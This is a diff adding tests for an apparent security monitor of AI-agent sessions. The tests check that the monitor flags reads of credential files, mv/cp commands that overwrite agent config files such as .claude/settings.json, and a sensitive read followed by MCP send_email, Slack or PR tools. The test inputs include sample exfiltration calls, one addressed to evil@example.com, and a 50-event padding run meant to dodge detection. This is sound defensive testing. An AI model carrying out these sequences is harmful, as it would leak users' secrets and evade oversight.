@@ -474,3 +474,319 @@ class TestEnforcementVerdict:
         verdict = mon.check_enforcement({"garbage": True})
         assert verdict is None
         mon.close()
+
+
+class TestExpandedSensitivePatterns:
+    """Expanded sensitive file patterns catch cloud credentials."""
+
+    def test_aws_credentials_detected(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        session = "aws-creds"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/home/user/.aws/credentials"}, session_id=session)
+        )
+        markers = mon.get_session_markers(session)
+        assert markers.last_sensitive_read is not None
+        mon.close()
+
+    def test_kube_config_detected(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        session = "kube"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/home/user/.kube/config"}, session_id=session)
+        )
+        markers = mon.get_session_markers(session)
+        assert markers.last_sensitive_read is not None
+        mon.close()
+
+    def test_gcp_credentials_detected(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        session = "gcp"
+        mon.record_event(
+            _make_data(
+                "Read",
+                {"file_path": "/home/user/.config/gcloud/application_default_credentials.json"},
+                session_id=session,
+            )
+        )
+        markers = mon.get_session_markers(session)
+        assert markers.last_sensitive_read is not None
+        mon.close()
+
+    def test_docker_config_detected(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        session = "docker"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/home/user/.docker/config.json"}, session_id=session)
+        )
+        markers = mon.get_session_markers(session)
+        assert markers.last_sensitive_read is not None
+        mon.close()
+
+    def test_pem_file_detected(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        session = "pem"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/etc/ssl/private/server.pem"}, session_id=session)
+        )
+        markers = mon.get_session_markers(session)
+        assert markers.last_sensitive_read is not None
+        mon.close()
+
+    def test_netrc_detected(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        session = "netrc"
+        mon.record_event(_make_data("Read", {"file_path": "/home/user/.netrc"}, session_id=session))
+        markers = mon.get_session_markers(session)
+        assert markers.last_sensitive_read is not None
+        mon.close()
+
+    def test_normal_file_not_sensitive(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        session = "normal"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/project/src/keyboard.py"}, session_id=session)
+        )
+        markers = mon.get_session_markers(session)
+        assert markers is None or markers.last_sensitive_read is None
+        mon.close()
+
+
+class TestBashConfigMove:
+    """SEQ-005 catches mv/cp to agent config paths via Bash."""
+
+    def test_mv_to_vscode_settings(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "mv-vscode"
+        mon.record_event(
+            _make_data(
+                "Bash", {"command": "mv /tmp/evil.json .vscode/settings.json"}, session_id=session
+            )
+        )
+        mon.close()
+        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
+        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
+        assert seq005, "SEQ-005 must fire for mv to .vscode/settings.json"
+
+    def test_cp_to_claude_settings(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "cp-claude"
+        mon.record_event(
+            _make_data(
+                "Bash", {"command": "cp /tmp/config.json .claude/settings.json"}, session_id=session
+            )
+        )
+        mon.close()
+        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
+        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
+        assert seq005, "SEQ-005 must fire for cp to .claude/settings.json"
+
+    def test_mv_to_mcp_config(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "mv-mcp"
+        mon.record_event(
+            _make_data("Bash", {"command": "mv /tmp/x.json mcp_config.json"}, session_id=session)
+        )
+        mon.close()
+        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
+        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
+        assert seq005, "SEQ-005 must fire for mv to mcp_config.json"
+
+    def test_mv_to_normal_file_no_fire(self, tmp_path):
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "mv-safe"
+        mon.record_event(
+            _make_data("Bash", {"command": "mv /tmp/data.json src/config.json"}, session_id=session)
+        )
+        mon.close()
+        if log_file.exists():
+            entries = [
+                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
+            ]
+            seq005 = [
+                e
+                for e in entries
+                if e.get("rule_id") == "SEQ-005" and e.get("session_id") == session
+            ]
+            assert not seq005
+
+
+class TestSEQ006:
+    """SEQ-006: Sensitive read -> MCP exfil-capable tool (advisory)."""
+
+    def test_seq006_fires_send_email(self, tmp_path):
+        """SEQ-006 fires when sensitive read is followed by mcp__gmail__send_email."""
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "seq006-email"
+        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
+        mon.record_event(
+            _make_data(
+                "mcp__gmail__send_email",
+                {"to": "evil@example.com", "body": "secrets"},
+                session_id=session,
+            )
+        )
+        mon.close()
+        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
+        seq006 = [e for e in entries if e.get("rule_id") == "SEQ-006"]
+        assert seq006, "SEQ-006 must fire for sensitive read -> mcp send_email"
+
+    def test_seq006_fires_create_pr(self, tmp_path):
+        """SEQ-006 fires when sensitive read is followed by mcp__github__create_pull_request."""
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "seq006-pr"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/home/user/.ssh/id_rsa"}, session_id=session)
+        )
+        mon.record_event(
+            _make_data(
+                "mcp__github__create_pull_request",
+                {"title": "update", "body": "data"},
+                session_id=session,
+            )
+        )
+        mon.close()
+        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
+        seq006 = [e for e in entries if e.get("rule_id") == "SEQ-006"]
+        assert seq006, "SEQ-006 must fire for sensitive read -> mcp create_pull_request"
+
+    def test_seq006_fires_post_comment(self, tmp_path):
+        """SEQ-006 fires for mcp tool with 'comment' in name."""
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "seq006-comment"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/home/user/.aws/credentials"}, session_id=session)
+        )
+        mon.record_event(
+            _make_data(
+                "mcp__jira__post_comment",
+                {"issue": "PROJ-1", "body": "data"},
+                session_id=session,
+            )
+        )
+        mon.close()
+        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
+        seq006 = [e for e in entries if e.get("rule_id") == "SEQ-006"]
+        assert seq006, "SEQ-006 must fire for sensitive read -> mcp post_comment"
+
+    def test_seq006_fires_despite_padding(self, tmp_path):
+        """SEQ-006 uses typed markers -- fires despite 50 padding events."""
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "seq006-padding"
+        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
+        for i in range(50):
+            mon.record_event(
+                _make_data(
+                    "Read",
+                    {"file_path": f"/project/file{i}.txt"},
+                    session_id=session,
+                    tool_use_id=f"pad_{i}",
+                )
+            )
+        mon.record_event(
+            _make_data(
+                "mcp__slack__send_message",
+                {"channel": "#general", "text": "leaked"},
+                session_id=session,
+            )
+        )
+        mon.close()
+        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
+        seq006 = [
+            e for e in entries if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
+        ]
+        assert seq006, "SEQ-006 must fire despite 50 padding events (typed marker)"
+
+    def test_seq006_no_fire_without_sensitive_read(self, tmp_path):
+        """SEQ-006 does NOT fire if no sensitive read in session."""
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "seq006-no-read"
+        mon.record_event(
+            _make_data("Read", {"file_path": "/project/README.md"}, session_id=session)
+        )
+        mon.record_event(
+            _make_data(
+                "mcp__gmail__send_email",
+                {"to": "user@example.com"},
+                session_id=session,
+            )
+        )
+        mon.close()
+        if log_file.exists():
+            entries = [
+                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
+            ]
+            seq006 = [
+                e
+                for e in entries
+                if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
+            ]
+            assert not seq006, "SEQ-006 should not fire without sensitive read"
+
+    def test_seq006_no_fire_read_only_mcp(self, tmp_path):
+        """SEQ-006 does NOT fire for MCP tools without exfil keywords."""
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "seq006-read-mcp"
+        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
+        mon.record_event(
+            _make_data(
+                "mcp__github__list_issues",
+                {"repo": "owner/repo"},
+                session_id=session,
+            )
+        )
+        mon.close()
+        if log_file.exists():
+            entries = [
+                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
+            ]
+            seq006 = [
+                e
+                for e in entries
+                if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
+            ]
+            assert not seq006, "SEQ-006 should not fire for read-only MCP tools (list_issues)"
+
+    def test_seq006_no_fire_non_mcp_tool(self, tmp_path):
+        """SEQ-006 does NOT fire for non-MCP tools even with exfil keywords."""
+        mon = _make_monitor(tmp_path)
+        log_file = tmp_path / "monitor.log"
+        session = "seq006-non-mcp"
+        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
+        mon.record_event(_make_data("send_message", {"to": "user"}, session_id=session))
+        mon.close()
+        if log_file.exists():
+            entries = [
+                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
+            ]
+            seq006 = [
+                e
+                for e in entries
+                if e.get("rule_id") == "SEQ-006" and e.get("session_id") == session
+            ]
+            assert not seq006, "SEQ-006 should only fire for mcp__* tools"
+
+    def test_seq006_is_advisory_not_enforcement(self, tmp_path):
+        """SEQ-006 should NOT block (not in _ENFORCEMENT_RULES)."""
+        mon = _make_monitor(tmp_path)
+        session = "seq006-advisory"
+        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
+        verdict = mon.check_enforcement(
+            _make_data(
+                "mcp__gmail__send_email",
+                {"to": "evil@example.com"},
+                session_id=session,
+            )
+        )
+        assert verdict is None, "SEQ-006 must be advisory-only (not in _ENFORCEMENT_RULES)"
+        mon.close()
